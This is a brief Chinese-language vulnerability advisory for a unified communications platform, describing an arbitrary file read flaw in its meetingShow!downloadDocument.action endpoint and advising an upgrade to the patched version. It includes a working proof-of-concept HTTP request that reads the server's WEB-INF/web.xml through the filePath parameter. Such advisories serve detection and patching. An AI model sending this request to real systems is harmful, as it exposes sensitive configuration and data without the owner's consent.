**一、漏洞简述**

统一通信平台是将将视频,语音、传真、电子邮件、WEB,移动短消息和多媒体数据等所有信息类型集合为一体，可用传统电话、IP电话,传真、手机、3G手机,PC、掌上电脑、Outlook,PDA等通信设备中的任何一种接收，在有线、无线、互联网之间架构起一个信息互联通道。其meetingShow!downloadDocument.action接口存在文件读取漏洞，攻击者可通过该漏洞获取到系统的敏感信息。

**二、漏洞检测poc**

```yaml
GET /acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

**四、修复**

官方已更新补丁，请升级至最新版本。

官网地址：http://www.iactive.com.cn/